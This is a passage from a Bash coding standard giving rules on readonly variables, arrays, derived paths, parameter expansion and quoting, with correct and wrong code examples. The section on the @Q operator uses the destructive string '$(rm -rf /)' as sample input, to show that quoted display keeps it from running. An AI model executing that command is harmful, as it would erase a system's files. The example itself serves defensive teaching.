# Script constants (not exported)
declare -r VERSION=2.1.0
declare -ri MAX_FILE_SIZE=$((100 * 1024 * 1024))  # 100MB

# Environment variables for child processes
declare -x LOG_LEVEL=${LOG_LEVEL:-INFO}
declare -x TEMP_DIR=${TMPDIR:-/tmp}

# Combined: readonly + exported
declare -rx BUILD_ENV=production

# Derived constants
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- SCRIPT_PATH SCRIPT_DIR
```


---


**Rule: BCS0205**

## Readonly After Group

**Declare variables with values first, then make them all readonly in a single statement.**

**Rationale:**
- Prevents assignment errors (cannot assign to already-readonly variable)
- Visual grouping of related constants as logical unit
- Clear immutability contract; explicit error if uninitialized variable made readonly
- Separates initialization phase from protection phase

**Three-Step Progressive Readonly Workflow:**

For variables finalized after argument parsing:

```bash
# Step 1 - Declare with defaults
declare -i VERBOSE=0 DRY_RUN=0
declare -- OUTPUT_FILE='' PREFIX=${PREFIX:-/usr/local}

# Step 2 - Parse and modify in main()
main() {
  while (($#)); do case $1 in
    -v)       VERBOSE+=1 ;;
    -n)       DRY_RUN=1 ;;
    --output) noarg "$@"; shift; OUTPUT_FILE=$1 ;;
    --prefix) noarg "$@"; shift; PREFIX=$1 ;;
  esac; shift; done

  # Step 3 - Make readonly AFTER parsing complete
  readonly -- VERBOSE DRY_RUN OUTPUT_FILE PREFIX

  ((VERBOSE)) && info "Using prefix: $PREFIX" ||:
}
```

**Exception - Script Metadata:**

As of BCS v1.0.1, `declare -r` is preferred for script metadata (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME). Other groups continue using readonly-after-group.

```bash
# Script metadata (uses declare -r, see BCS0103)
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Variable Groups:**

**1. Color definitions:**
```bash
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**2. Path constants:**
```bash
declare -- PREFIX=${PREFIX:-/usr/local}
declare -- BIN_DIR="$PREFIX"/bin
declare -- SHARE_DIR="$PREFIX"/share/myapp
readonly -- PREFIX BIN_DIR SHARE_DIR
```

**3. Configuration defaults:**
```bash
declare -i DEFAULT_TIMEOUT=30
declare -i DEFAULT_RETRIES=3
declare -- DEFAULT_LOG_LEVEL=info
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES DEFAULT_LOG_LEVEL
```

**Anti-patterns:**

```bash
# ✗ Wrong - making readonly before all values set
PREFIX=/usr/local
readonly -- PREFIX  # Premature!
BIN_DIR="$PREFIX"/bin  # If this fails, inconsistent protection

# ✓ Correct - all values set, then all readonly
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
readonly -- PREFIX BIN_DIR SHARE_DIR

# ✗ Wrong - forgetting -- separator
readonly PREFIX BIN_DIR  # Risky if variable name starts with -

# ✓ Correct - always use -- separator
readonly -- PREFIX BIN_DIR

# ✗ Wrong - mixing unrelated variables
CONFIG_FILE=config.conf
VERBOSE=1
PREFIX=/usr/local
readonly -- CONFIG_FILE VERBOSE PREFIX  # No logical grouping!

# ✗ Wrong - readonly inside conditional
if [[ -f config.conf ]]; then
  CONFIG_FILE=config.conf
  readonly -- CONFIG_FILE
fi
# CONFIG_FILE might not be readonly if condition false!

# ✓ Correct - initialize with default, then readonly
CONFIG_FILE=${CONFIG_FILE:-config.conf}
readonly -- CONFIG_FILE
```

**Edge Cases:**

**Derived variables** - initialize in dependency order:
```bash
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
readonly -- PREFIX BIN_DIR SHARE_DIR
```

**Conditional initialization:**
```bash
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'; NC=$'\033[0m'
else
  RED=''; NC=''
fi
readonly -- RED NC  # Safe after conditional
```

**Arrays:**
```bash
declare -a REQUIRED_COMMANDS=(git make tar)
readonly -a REQUIRED_COMMANDS
```

**Delayed readonly (after argument parsing):**
```bash
declare -i VERBOSE=0
declare -- CONFIG_FILE=''

main() {
  while (($#)); do case $1 in
    -v) VERBOSE+=1 ;;
    -c) noarg "$@"; shift; CONFIG_FILE=$1 ;;
  esac; shift; done

  readonly -- VERBOSE
  [[ -z "$CONFIG_FILE" ]] || readonly -- CONFIG_FILE
}
```

**When NOT to use readonly:**
```bash
# Don't make readonly if value changes during execution
declare -i count=0  # Modified in loops

# Only make readonly when value is final
[[ -z "$config_file" ]] || readonly -- config_file
```

**Key Principles:**
- Initialize first, readonly second
- Group logically related variables
- Always use `--` separator
- Make readonly as soon as values are final
- Use `readonly -p` to verify status


---


**Rule: BCS0206**

## Readonly Declaration
Use `declare -r` or `readonly` for constants to prevent accidental modification.

```bash
declare -ar REQUIRED=(pandoc git md2ansi)
#shellcheck disable=SC2155 # acceptable; if realpath fails then we have much bigger problems
declare -r SCRIPT_PATH=$(realpath -- "$0")
```


---


**Rule: BCS0207**

## Arrays

**Rule: BCS0207**

Array declaration, usage, and safe list handling.

---

#### Rationale

Arrays provide element preservation, no word splitting with `"${array[@]}"`, glob safety, and safe command construction with arbitrary arguments.

---

#### Declaration

```bash
# Indexed arrays (explicit declaration)
declare -a paths=()           # Empty array
declare -a colors=(red green blue)

# Local arrays in functions
local -a found_files=()

# Associative arrays (Bash 4.0+)
declare -A config=()
config['key']='value'
```

#### Adding Elements

```bash
# Append single element
paths+=("$1")

# Append multiple elements
args+=("$arg1" "$arg2" "$arg3")

# Append another array
all_files+=("${config_files[@]}")
all_files+=("$@")
```

#### Iteration

```bash
# ✓ Correct - quoted expansion, handles spaces
for path in "${paths[@]}"; do
  process "$path"
done

# ✗ Wrong - unquoted, breaks with spaces
for path in ${paths[@]}; do
  process "$path"
done
```

#### Length and Checking

```bash
count=${#files[@]}

# Check if empty
if ((${#array[@]} == 0)); then
  info 'Array is empty'
fi

# Set default if empty
((${#paths[@]})) || paths=('.')
```

#### Reading Into Arrays

```bash
# Split string by delimiter
IFS=',' read -ra fields <<< "$csv_line"

# From command output (preferred)
readarray -t lines < <(grep pattern file)
mapfile -t files < <(find . -name "*.txt")

# From file
readarray -t config_lines < config.txt
```

#### Element Access

```bash
first=${array[0]}
last=${array[-1]}           # Bash 4.3+

"${array[@]}"               # Each as separate word
"${array[*]}"               # All as single word (rare)

# Slice
"${array[@]:2}"             # From index 2
"${array[@]:1:3}"           # 3 elements from index 1
```

---

#### Safe Command Construction

```bash
local -a cmd=(myapp --config "$config_file")

# Add conditional arguments
((verbose)) && cmd+=(--verbose) ||:
[[ -z "$output" ]] || cmd+=(--output "$output")

# Execute safely
"${cmd[@]}"
```

#### Collecting Arguments During Parsing

```bash
declare -a input_files=()
while (($#)); do
  case $1 in
    -*)  handle_option "$1" ;;
    *)   input_files+=("$1") ;;
  esac
  shift
done

for file in "${input_files[@]}"; do
  process_file "$file"
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted expansion
rm ${files[@]}
# ✓ Correct - quoted expansion
rm "${files[@]}"

# ✗ Wrong - word splitting to create array
array=($string)
# ✓ Correct - explicit
readarray -t array <<< "$string"

# ✗ Wrong - using [*] in iteration
for item in "${array[*]}"; do
# ✓ Correct - use [@]
for item in "${array[@]}"; do
```

---

#### Operator Summary

| Operation | Syntax | Description |
|-----------|--------|-------------|
| Declare | `declare -a arr=()` | Create empty array |
| Append | `arr+=("value")` | Add element |
| Length | `${#arr[@]}` | Number of elements |
| All elements | `"${arr[@]}"` | Each as separate word |
| Single element | `"${arr[i]}"` | Element at index i |
| Last element | `"${arr[-1]}"` | Last element |
| Slice | `"${arr[@]:2:3}"` | 3 elements from index 2 |
| Indices | `"${!arr[@]}"` | All array indices |

**Key principle:** Always quote array expansions: `"${array[@]}"` to preserve spacing and prevent word splitting.


---


**Rule: BCS0208**

## Reserved for Future Use

**Rule: BCS0208**

---

Reserved placeholder for future Variables & Data Types expansion.

#### Purpose

- Maintains numerical sequence integrity (consistent two-digit BCS codes)
- Allows additions without code renumbering
- Prevents external reference conflicts

#### Possible Future Topics

- Nameref variables (`declare -n`)
- Indirect variable expansion (`${!var}`)
- Variable attributes and introspection
- Typed variable best practices

#### Note

Do not use BCS0208 until this placeholder is replaced with actual content.

---

**Status:** Reserved
**Version:** 1.0.0


---


**Rule: BCS0209**

## Derived Variables

**Variables computed from other variables for paths, configurations, or composite values. Group with section comments explaining dependencies. Update all derived variables when base variables change (especially during argument parsing).**

**Rationale:**
- DRY Principle: Single source of truth for base values
- Consistency: When PREFIX changes, all paths update automatically
- Clarity: Section comments make variable relationships obvious
- Correctness: Updating derived variables when base changes prevents subtle bugs

**Simple derived variables:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX=/usr/local
declare -- APP_NAME=myapp

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# All paths derived from PREFIX
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"

# Application-specific derived paths
declare -- CONFIG_DIR="$HOME"/."$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR"/config.conf
declare -- CACHE_DIR="$HOME"/.cache/"$APP_NAME"
```

**XDG Base Directory compliance:**

```bash
# XDG_CONFIG_HOME with fallback to $HOME/.config
declare -- CONFIG_BASE=${XDG_CONFIG_HOME:-"$HOME"/.config}
declare -- CONFIG_DIR="$CONFIG_BASE"/"$APP_NAME"

# XDG_DATA_HOME with fallback to $HOME/.local/share
declare -- DATA_BASE=${XDG_DATA_HOME:-"$HOME"/.local/share}
declare -- DATA_DIR="$DATA_BASE"/"$APP_NAME"

# XDG_STATE_HOME with fallback to $HOME/.local/state (for logs)
declare -- STATE_BASE=${XDG_STATE_HOME:-"$HOME"/.local/state}
declare -- LOG_DIR="$STATE_BASE"/"$APP_NAME"

# XDG_CACHE_HOME with fallback to $HOME/.cache
declare -- CACHE_BASE=${XDG_CACHE_HOME:-"$HOME"/.cache}
declare -- CACHE_DIR="$CACHE_BASE"/"$APP_NAME"
```

**Updating derived variables when base changes:**

```bash
# Update all derived paths when PREFIX changes
update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib/"$APP_NAME"
  SHARE_DIR="$PREFIX"/share/"$APP_NAME"
  DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"
  info "Updated paths for PREFIX=${PREFIX@Q}"
}

main() {
  while (($#)); do
    case $1 in
      --prefix)
        noarg "$@"; shift
        PREFIX=$1
        # IMPORTANT: Update all derived paths when PREFIX changes
        update_derived_paths
        ;;
      --app-name)
        noarg "$@"; shift
        APP_NAME=$1
        # DOC_DIR depends on APP_NAME, update it
        DOC_DIR="$PREFIX"/share/doc/"$APP_NAME"
        ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- PREFIX APP_NAME BIN_DIR LIB_DIR SHARE_DIR DOC_DIR
}
```

**Complex derivations with multiple dependencies:**

```bash
declare -- ENVIRONMENT=production
declare -- REGION=us-east
declare -- APP_NAME=myapp

# Composite identifiers derived from base values
declare -- DEPLOYMENT_ID="$APP_NAME-$ENVIRONMENT-$REGION"
declare -- LOG_PREFIX="$ENVIRONMENT/$REGION/$APP_NAME"

# Paths that depend on environment
declare -- CONFIG_DIR=/etc/"$APP_NAME"/"$ENVIRONMENT"
declare -- CONFIG_FILE="$CONFIG_DIR"/config-"$REGION".conf

# Derived URLs
declare -- API_HOST=api-"$ENVIRONMENT".example.com
declare -- API_URL="https://$API_HOST/v1"
```

**Anti-patterns:**

```bash
# ✗ Wrong - duplicating values instead of deriving
PREFIX=/usr/local
BIN_DIR=/usr/local/bin        # Duplicates PREFIX!

# ✓ Correct - derive from base value
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin           # Derived from PREFIX

# ✗ Wrong - not updating derived variables when base changes
main() {
  case $1 in
    --prefix)
      shift
      PREFIX=$1
      # BIN_DIR and LIB_DIR are now wrong!
      ;;
  esac
}

# ✓ Correct - update derived variables
main() {
  case $1 in
    --prefix)
      noarg "$@"; shift
      PREFIX=$1
      BIN_DIR="$PREFIX"/bin     # Update derived
      LIB_DIR="$PREFIX"/lib     # Update derived
      ;;
  esac
}

# ✗ Wrong - making derived variables readonly before base
BIN_DIR="$PREFIX"/bin
readonly -- BIN_DIR             # Can't update if PREFIX changes!
PREFIX=/usr/local

# ✓ Correct - make readonly after all values set
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin
# Parse arguments that might change PREFIX...
readonly -- PREFIX BIN_DIR      # Now make readonly

# ✗ Wrong - inconsistent derivation
CONFIG_DIR=/etc/myapp                  # Hardcoded
LOG_DIR=/var/log/"$APP_NAME"           # Derived from APP_NAME

# ✓ Correct - consistent derivation
CONFIG_DIR=/etc/"$APP_NAME"            # Derived
LOG_DIR=/var/log/"$APP_NAME"           # Derived
```

**Edge cases:**

**1. Conditional derivation:**

```bash
# Different paths for development vs production
if [[ "$ENVIRONMENT" == development ]]; then
  CONFIG_DIR="$SCRIPT_DIR"/config
  LOG_DIR="$SCRIPT_DIR"/logs
else
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
fi

# Derived from environment-specific directories
CONFIG_FILE="$CONFIG_DIR"/config.conf
```

**2. Hardcoded exceptions:**

```bash
# Most paths derived from PREFIX
PREFIX=/usr/local
BIN_DIR="$PREFIX"/bin

# Exception: System-wide profile must be in /etc regardless of PREFIX
# Reason: Shell initialization requires fixed path for all users
PROFILE_DIR=/etc/profile.d           # Hardcoded by design
PROFILE_FILE="$PROFILE_DIR"/"$APP_NAME".sh
```

**3. Platform-specific derivations:**

```bash
case "$(uname -s)" in
  Darwin)
    LIB_EXT=dylib
    CONFIG_DIR="$HOME/Library/Application Support/$APP_NAME"
    ;;
  Linux)
    LIB_EXT=so
    CONFIG_DIR="$HOME"/.config/"$APP_NAME"
    ;;
esac

LIBRARY_NAME=lib"$APP_NAME"."$LIB_EXT"
```

**Summary:**
- Group derived variables with section comments explaining dependencies
- Derive from base values - never duplicate, always compute
- Update when base changes - especially during argument parsing
- Document hardcoded exceptions that don't derive
- Use `${XDG_VAR:-$HOME/default}` pattern for environment fallbacks
- Make readonly after all parsing and derivation complete
- Clear dependency chain: base �' derived1 �' derived2


---


**Rule: BCS0210**

## Parameter Expansion & Braces Usage

**Rule: BCS0210** (Merged from BCS0301 + BCS0302)

Variable expansion operations and when to use braces.

---

#### General Rule

Always quote variables with `"$var"` as the default form. Only use braces `"${var}"` when syntactically necessary.

**Rationale:** Braces add visual noise without value when not required. Using them only when necessary makes code cleaner and necessary cases stand out.

---

#### Parameter Expansion Operations

```bash
# Pattern removal
SCRIPT_NAME=${SCRIPT_PATH##*/}  # Remove longest prefix pattern
SCRIPT_DIR=${SCRIPT_PATH%/*}    # Remove shortest suffix pattern

# Default values
${var:-default}                 # Use default if unset or null
${var:=default}                 # Set default if unset or null
${var:+alternate}               # Use alternate if set and non-null

# Substrings
${var:0:5}                      # First 5 characters
${var:(-3)}                     # Last 3 characters

# Pattern substitution
${var//old/new}                 # Replace all occurrences
${var/old/new}                  # Replace first occurrence
${var/#pattern/replace}         # Replace prefix
${var/%pattern/replace}         # Replace suffix

# Case conversion (Bash 4.0+)
${var,,}                        # All lowercase
${var^^}                        # All uppercase
${var~}                         # Toggle first char
${var~~}                        # Toggle all chars

# Special parameters
"${@:2}"                        # All args from 2nd onwards
"${10}"                         # Positional param > 9
${#var}                         # String length
${!prefix@}                     # Variables starting with prefix
```

---

#### When Braces Are REQUIRED

1. **Parameter expansion operations:** `"${var##*/}"`, `"${var:-default}"`, `"${var:0:5}"`, `"${var//old/new}"`, `"${var,,}"`

2. **Variable concatenation (no separator):** `"${var1}${var2}"`, `"${prefix}suffix"`

3. **Array access:** `"${array[index]}"`, `"${array[@]}"`, `"${#array[@]}"`

4. **Special parameter expansion:** `"${@:2}"`, `"${10}"`, `"${!var}"`

---

#### When Braces Are NOT Required

```bash
# ✓ Standalone variables
"$var"  "$HOME"  "$SCRIPT_DIR"

# ✓ Path concatenation with separators
"$PREFIX"/bin
"$SCRIPT_DIR"/build/lib

# ✓ In strings with separators
echo "Installing to $PREFIX/bin"
info "Found $count files"

# ✗ Wrong - unnecessary braces
"${var}"  "${PREFIX}"/bin  "${count}"
```

---

#### Edge Cases

```bash
# Braces required - next char alphanumeric, no separator
"${var}_suffix"      # Prevents $var_suffix
"${prefix}123"       # Prevents $prefix123

# No braces needed - separator present
"$var-suffix"        # Dash separates
"$var.suffix"        # Dot separates
"$var/path"          # Slash separates
```

---

#### Summary Table

| Situation | Form | Example |
|-----------|------|---------|
| Standalone variable | `"$var"` | `"$HOME"` |
| Path with separator | `"$var"/path` | `"$BIN_DIR"/file` |
| Parameter expansion | `"${var%pattern}"` | `"${path%/*}"` |
| Concatenation (no sep) | `"${var1}${var2}"` | `"${prefix}${suffix}"` |
| Array access | `"${array[i]}"` | `"${args[@]}"` |

**Key Principle:** Use `"$var"` by default. Only add braces when required for correct parsing.


---


**Rule: BCS0211**

## Boolean Flags Pattern

Use integer variables with `declare -i` or `local -i` for boolean state tracking:

```bash
# Boolean flags - declare as integers with explicit initialization
declare -i INSTALL_BUILTIN=0
declare -i DRY_RUN=0
declare -i VERBOSE=0

# Test flags in conditionals using (())
((DRY_RUN)) && info 'Dry-run mode enabled' ||:

if ((INSTALL_BUILTIN)); then
  install_loadable_builtins
fi

# Toggle flags
((VERBOSE)) && VERBOSE=0 || VERBOSE=1

# Set flags from command-line parsing
case $1 in
  --dry-run)    DRY_RUN=1 ;;
  --skip-build) SKIP_BUILD=1 ;;
esac
```

**Guidelines:**
- Use `declare -i` for integer-based boolean flags
- Name flags in ALL_CAPS (e.g., `DRY_RUN`, `INSTALL_BUILTIN`)
- Initialize explicitly to `0` (false) or `1` (true)
- Test with `((FLAG))` (true for non-zero, false for zero)
- Don't mix boolean flags with integer counters


---


**Rule: BCS0300**

# Strings & Quoting

Core principle: **single quotes** for static strings, **double quotes** when variable expansion is needed.

**7 Rules:**

1. **Quoting Fundamentals** (BCS0301) - Core rules for static vs. dynamic strings
2. **Command Substitution** (BCS0302) - Quoting `$(...)` results
3. **Quoting in Conditionals** (BCS0303) - Variable quoting in `[[ ]]`
4. **Here Documents** (BCS0304) - Delimiter quoting for heredocs
5. **printf Patterns** (BCS0305) - Format string and argument quoting
6. **Parameter Quoting** (BCS0306) - Using `${param@Q}` for safe display
7. **Anti-Patterns** (BCS0307) - Common quoting mistakes to avoid

Single quotes signal "literal text"; double quotes signal "variable expansion needed."


---


**Rule: BCS0301**

## Quoting Fundamentals

**Rule: BCS0301** (Merged from BCS0401 + BCS0402 + BCS0403 + BCS0404)

Core quoting rules for strings, variables, and literals.

---

#### The Fundamental Rule

**Single quotes** for static strings, **double quotes** when variable expansion needed.

```bash
# ✓ Correct - single quotes for static
info 'Checking prerequisites...'
error 'Failed to connect'
[[ "$status" == 'success' ]]

# ✓ Correct - double quotes for variables
info "Found $count files"
die 1 "File '$SCRIPT_DIR/testfile' not found"
echo "$SCRIPT_NAME $VERSION"
```

---

#### Why Single Quotes for Static Strings

1. **Performance**: Slightly faster (no variable/escape parsing)
2. **Clarity**: Signals "this is literal, no substitution"
3. **Safety**: Prevents accidental expansion
4. **No escaping**: `$`, `` ` ``, `\` are literal

```bash
# Single quotes preserve special characters
msg='The variable $PATH will not expand'
sql='SELECT * FROM users WHERE name = "John"'
regex='^\$[0-9]+\.[0-9]{2}$'
```

---

#### Mixed Quoting Pattern

Nest single quotes inside double quotes for literal display:

```bash
die 1 "Unknown option '$1'"
warn "Cannot access '$file_path'"
```

---

#### One-Word Literal Exception

Simple alphanumeric values (`a-zA-Z0-9_-./`) may be unquoted:

```bash
# ✓ Both acceptable
STATUS=success
[[ "$level" == INFO ]]
STATUS='success'
```

**Mandatory quoting:** Spaces, special chars (`@`, `*`), empty strings, values with `$`/quotes/backslashes.

---

#### Anti-Patterns

```bash
# ✗ Wrong - double quotes for static strings
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]
```

```bash
# ✗ Wrong - special characters unquoted
EMAIL=user@domain.com
PATTERN=*.log

# ✓ Correct
EMAIL='user@domain.com'
PATTERN='*.log'
```

---

#### Path Concatenation Quoting

Quote variable portion separately from literal for clarity:

```bash
# ✓ RECOMMENDED - separate quoting
"$PREFIX"/bin
"$SCRIPT_DIR"/data/"$filename"
[[ -f "$CONFIG_DIR"/hosts.conf ]]

# ACCEPTABLE - combined
"$PREFIX/bin"
"$SCRIPT_DIR/data/$filename"
```

Separate quoting makes variable boundaries visually explicit and improves readability in complex paths.

---

#### Quick Reference

| Content | Quote Type | Example |
|---------|------------|---------|
| Static text | Single | `'Processing...'` |
| With variable | Double | `"Found $count files"` |
| Variable in quotes | Mixed | `"Option '$1' invalid"` |
| One-word literal | Optional | `STATUS=success` |
| Special chars | Single | `'user@example.com'` |
| Empty string | Single | `VAR=''` |
| Path with separator | Separate | `"$var"/path` |

**Key principle:** Use single quotes as default. Double quotes only when expansion needed.


---


**Rule: BCS0302**

## Command Substitution

**Rule: BCS0302** (From BCS0405)

Quoting rules for command substitution.

---

#### Rule

Use double quotes when strings include command substitution:

```bash
# ✓ Correct
echo "Current time: $(date +%T)"
info "Found $(wc -l < "$file") lines"
```

Variable assignment: quotes only required when concatenating values:

```bash
# ✓ Correct - no quotes needed for simple assignment
VERSION=$(git describe --tags 2>/dev/null || echo 'unknown')
TIMESTAMP=$(date -Ins)
BASEDIR=$PREFIX

# ✗ Wrong - unnecessary quotes
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')"

# ✓ Correct - quotes required for concatenation
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')".beta
TIMESTAMP="$(date -Ins)"-Jakarta
BASEDIR="$PREFIX"/config
```

---

#### Always Quote the Result

```bash
# ✓ Correct
result=$(command)
echo "$result"

# ✗ Wrong - word splitting occurs
echo $result
```

**Key principle:** Quote command substitution results to preserve whitespace and prevent word splitting.


---


**Rule: BCS0303**

## Quoting in Conditionals

**Rule: BCS0303** — Variable quoting in test expressions.

---

#### The Rule

**Always quote variables** in conditionals. Static comparison values follow normal rules (single quotes for literals with breaking chars).

```bash
# ✓ Correct - variable quoted
[[ -f "$file" ]]
[[ "$name" == value ]]

# ✗ Wrong - unquoted variable
[[ -f $file ]]
[[ $name == value ]]
```

---

#### Why Quote Variables

1. **Word splitting**: `$file` with spaces becomes multiple arguments
2. **Glob expansion**: `$file` with `*` expands to matching files
3. **Empty values**: Unquoted empty variables cause syntax errors
4. **Security**: Prevents injection attacks

---

#### Common Patterns

```bash
# File tests
[[ -f "$file" ]]
[[ -d "$directory" && -r "$directory" ]]

# String comparisons (variable quoted, literal single-quoted)
[[ "$action" == 'start' ]]
[[ -z "$value" ]]
[[ -n "$result" ]]

# Numeric comparisons
declare -i count=0
((count > 10))

# Pattern matching (pattern unquoted for globbing)
[[ "$filename" == *.txt ]]        # Glob match
[[ "$filename" == '*.txt' ]]      # Literal match

# Regex (pattern variable unquoted)
pattern='^[0-9]+$'
[[ "$input" =~ $pattern ]]        # ✓ Pattern unquoted
[[ "$input" =~ "$pattern" ]]      # ✗ Becomes literal
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted variable
[[ -f $file ]] # Breaks with spaces
[[ $name == value with breaking chars ]] # Breaks with spaces

# ✗ Wrong - double quotes for static literal
[[ "$mode" == "production" ]]

# ✓ Correct
[[ "$mode" == 'production' ]]
[[ "$mode" == production ]]  # One-word literal OK
```

---

**Key principle:** Variable quoting in conditionals is mandatory. Quote all variables: `[[ -f "$file" ]]`.


---


**Rule: BCS0304**

## Here Documents

**Rule: BCS0304** (Merged from BCS0408 + BCS1104)

Quoting rules for here documents.

---

#### Delimiter Quoting

| Delimiter | Variable Expansion | Use Case |
|-----------|-------------------|----------|
| `<<EOF` | Yes | Dynamic content with variables |
| `<<'EOF'` | No | Literal content (JSON, SQL) |
| `<<"EOF"` | No | Same as single quotes |

---

#### With Variable Expansion

```bash
# Unquoted delimiter - variables expand
cat <<EOF
User: $USER
Home: $HOME
Time: $(date)
EOF
```

---

#### Literal Content (No Expansion)

```bash
# Single-quoted delimiter - no expansion
cat <<'EOF'
{
  "name": "$APP_NAME",
  "version": "$VERSION"
}
EOF
```

---

#### Indented Content

```bash
# <<- removes leading tabs (not spaces)
if condition; then
	cat <<-EOF
	Indented content
	Aligned with code
	EOF
fi
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted when literal needed
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF
# SQL injection risk if $name is attacker-controlled!

# ✓ Correct - quoted for literal SQL
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

---

**Key principle:** Quote the delimiter (`<<'EOF'`) to prevent expansion; leave unquoted for variable substitution.


---


**Rule: BCS0305**

## printf Patterns

**Rule: BCS0305** — Quoting rules for printf and echo.

---

#### Basic Pattern

```bash
# Format string: single quotes (static)
# Variables: double-quoted as arguments
printf '%s: %d files found\n' "$name" "$count"

# Static strings - single quotes
echo 'Installation complete'
printf '%s\n' 'Processing files'

# With variables - double quotes
echo "$SCRIPT_NAME $VERSION"
printf 'Found %d files in %s\n' "$count" "$dir"
```

#### Format String Escapes

```bash
printf '%s\n'   "$string"       # String
printf '%d\n'   "$integer"      # Decimal
printf '%f\n'   "$float"        # Float
printf '%x\n'   "$hex"          # Hexadecimal
printf '%%\n'                   # Literal %
```

#### Prefer printf Over echo -e

```bash
# ✗ Avoid - echo -e behavior varies
echo -e "Line1\nLine2"

# ✓ Prefer - printf is consistent
printf 'Line1\nLine2\n'

# Or use $'...' for escape sequences
echo $'Line1\nLine2'
```

---

**Key principle:** Single quotes for format strings, double quotes for variable arguments.


---


**Rule: BCS0306**

## Parameter Quoting with @Q

**Rule: BCS0306**

Using `${parameter@Q}` for safe display of user input.

---

#### The @Q Operator

`${parameter@Q}` expands to a shell-quoted value that can be safely displayed and re-used.

```bash
name='hello world'
echo "${name@Q}"      # Output: 'hello world'

name='$(rm -rf /)'
echo "${name@Q}"      # Output: '$(rm -rf /)' (safe, literal)
```

---

#### Primary Use: Error Messages

```bash
# ✗ Wrong - injection risk
die 2 "Unknown option $1"

# ✓ Correct - safe display
die 2 "Unknown option ${1@Q}"

# Validation function
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

---

#### Dry-Run Display

```bash
run_command() {
  local -a cmd=("$@")
  if ((DRY_RUN)); then
    local -- quoted_cmd
    printf -v quoted_cmd '%s ' "${cmd[@]@Q}"
    info "[DRY-RUN] Would execute: $quoted_cmd"
    return 0
  fi
  "${cmd[@]}"
}
```

---

#### Comparison

| Input | `$var` | `"$var"` | `${var@Q}` |
|-------|--------|----------|------------|
| `hello world` | splits | `hello world` | `'hello world'` |
| `$(date)` | executes | executes | `'$(date)'` |
| `*.txt` | globs | `*.txt` | `'*.txt'` |

---

#### When to Use

**Use @Q for:** Error messages, logging user input, dry-run output.

**Don't use @Q for:** Normal variable expansion, comparisons.

---

**Key principle:** Use `${parameter@Q}` when displaying user input in error messages to prevent injection.


---


**Rule: BCS0307**

## Quoting Anti-Patterns

**Rule: BCS0307**

Common quoting mistakes to avoid.

---

#### Category 1: Double Quotes for Static Strings

```bash
# ✗ Wrong
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]
```

---

#### Category 2: Unquoted Variables

```bash
# ✗ Wrong - word splitting/glob expansion
[[ -f $file ]]
echo $result
rm $temp_file

# ✓ Correct
[[ -f "$file" ]]
echo "$result"
rm "$temp_file"
```

---

#### Category 3: Unnecessary Braces

```bash
# ✗ Wrong - braces not needed
echo "${HOME}/bin"
path="${CONFIG_DIR}/app.conf"

# ✓ Correct
echo "$HOME"/bin
path="$CONFIG_DIR"/app.conf

# Braces ARE needed for:
"${var:-default}"     # Default value
"${file##*/}"         # Parameter expansion
"${array[@]}"         # Array expansion
"${var1}${var2}"      # Adjacent variables
```

---

#### Category 4: Unquoted Arrays

```bash
# ✗ Wrong
for item in ${items[@]}; do

# ✓ Correct
for item in "${items[@]}"; do
```

---

#### Category 5: Glob Expansion Danger

```bash
pattern='*.txt'

# ✗ Wrong
echo $pattern       # Expands to all .txt files!

# ✓ Correct
echo "$pattern"     # Outputs literal: *.txt
```

---

#### Category 6: Here-doc Delimiter

```bash
# ✗ Wrong - variables expand unexpectedly
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF

# ✓ Correct - quoted for literal content
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

---

#### Quick Reference

| Context | Correct | Wrong |
|---------|---------|-------|
| Static string | `'literal'` | `"literal"` |
| Variable | `"$var"` | `$var` |
| Path with var | `"$HOME"/bin` | `"${HOME}/bin"` |
